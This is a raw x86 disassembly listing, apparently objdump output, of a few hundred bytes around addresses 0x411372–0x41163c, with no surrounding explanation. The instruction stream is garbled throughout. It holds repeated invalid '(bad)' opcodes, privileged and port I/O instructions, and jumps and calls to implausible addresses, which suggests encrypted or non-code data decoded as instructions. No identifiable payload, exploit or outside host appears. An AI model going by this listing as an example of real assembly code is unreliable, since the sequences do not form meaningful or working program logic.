  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
